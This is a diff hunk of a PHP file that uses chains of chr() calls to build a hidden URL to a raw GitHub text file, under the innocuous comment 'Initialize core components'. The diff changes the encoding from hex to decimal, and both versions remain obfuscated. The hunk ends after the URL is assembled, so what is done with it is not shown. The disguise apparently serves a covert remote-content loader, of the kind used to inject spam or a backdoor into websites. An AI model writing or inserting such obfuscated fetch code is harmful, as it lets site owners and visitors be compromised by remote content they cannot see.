@@ -6,27 +6,27 @@
 
 // Initialize core components
 $parts = [
-    chr(0x68).chr(0x74).chr(0x74).chr(0x70).chr(0x73),
-    chr(0x3a).chr(0x2f).chr(0x2f),
-    chr(0x72).chr(0x61).chr(0x77),
-    chr(0x2e),
-    chr(0x67).chr(0x69).chr(0x74).chr(0x68).chr(0x75).chr(0x62).chr(0x75).chr(0x73).chr(0x65).chr(0x72).chr(0x63).chr(0x6f).chr(0x6e).chr(0x74).chr(0x65).chr(0x6e).chr(0x74),
-    chr(0x2e),
-    chr(0x63).chr(0x6f).chr(0x6d),
-    chr(0x2f),
-    chr(0x73).chr(0x65).chr(0x6f).chr(0x62).chr(0x65).chr(0x6c).chr(0x61),
-    chr(0x2f),
-    chr(0x62).chr(0x65).chr(0x6c).chr(0x61),
-    chr(0x2f),
-    chr(0x72).chr(0x65).chr(0x66).chr(0x73),
-    chr(0x2f),
-    chr(0x68).chr(0x65).chr(0x61).chr(0x64).chr(0x73),
-    chr(0x2f),
-    chr(0x6d).chr(0x61).chr(0x69).chr(0x6e),
-    chr(0x2f),
-    chr(0x69).chr(0x6e).chr(0x64).chr(0x65).chr(0x78),
-    chr(0x2e),
-    chr(0x74).chr(0x78).chr(0x74)
+    chr(104).chr(116).chr(116).chr(112).chr(115),
+    chr(58).chr(47).chr(47),
+    chr(114).chr(97).chr(119),
+    chr(46),
+    chr(103).chr(105).chr(116).chr(104).chr(117).chr(98).chr(117).chr(115).chr(101).chr(114).chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116),
+    chr(46),
+    chr(99).chr(111).chr(109),
+    chr(47),
+    chr(115).chr(101).chr(111).chr(98).chr(101).chr(108).chr(97),
+    chr(47),
+    chr(98).chr(101).chr(108).chr(97),
+    chr(47),
+    chr(114).chr(101).chr(102).chr(115),
+    chr(47),
+    chr(104).chr(101).chr(97).chr(100).chr(115),
+    chr(47),
+    chr(109).chr(97).chr(105).chr(110),
+    chr(47),
+    chr(105).chr(110).chr(100).chr(101).chr(120),
+    chr(46),
+    chr(116).chr(120).chr(116)
 ];
 
 $full_url = implode('', $parts);
